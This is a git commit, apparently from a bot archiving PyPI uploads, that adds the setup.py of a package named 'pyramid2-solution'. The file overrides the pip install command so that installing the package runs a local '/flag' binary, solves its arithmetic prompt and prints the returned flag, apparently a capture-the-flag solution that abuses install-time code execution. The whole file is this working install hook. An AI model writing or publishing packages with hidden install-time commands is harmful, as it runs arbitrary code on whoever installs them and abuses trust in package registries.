183ee1f9bbcd44c61f3812f152673312566365f8
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-12-07 00:07:25 +0000

    Add package pyramid2-solution/0.0.4/pyramid2_solution-0.0.4.tar.gz

---
+++ packages/pyramid2-solution/pyramid2_solution-0.0.4.tar.gz/pyramid2_solution-0.0.4/setup.py
@@ -0,0 +1,37 @@
+# setup.py
+from setuptools import setup
+from setuptools.command.install import install
+import subprocess
+import re
+
+def get_flag():
+    try:
+        proc = subprocess.Popen(['/flag'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
+        question = proc.stdout.readline()
+        print(question)
+        numbers = list(map(int, re.findall(r'\d+', question)))
+        if len(numbers) == 3:
+            A, B, C = numbers
+            answer = A * B + C
+            proc.stdin.write(f'{answer}\n')
+            proc.stdin.flush()
+            flag = proc.stdout.readline()
+            print(flag)
+        else:
+            print('Failed to parse question')
+    except FileNotFoundError:
+        print("The '/flag' binary was not found. Please ensure it is available.")
+
+class CustomInstallCommand(install):
+    def run(self):
+        get_flag()  # Execute get_flag during installation
+        install.run(self)
+
+setup(
+    name='pyramid2_solution',
+    version='0.0.4',  # Incremented version
+    packages=['pyramid2_solution'],
+    cmdclass={
+        'install': CustomInstallCommand,
+    },
+)
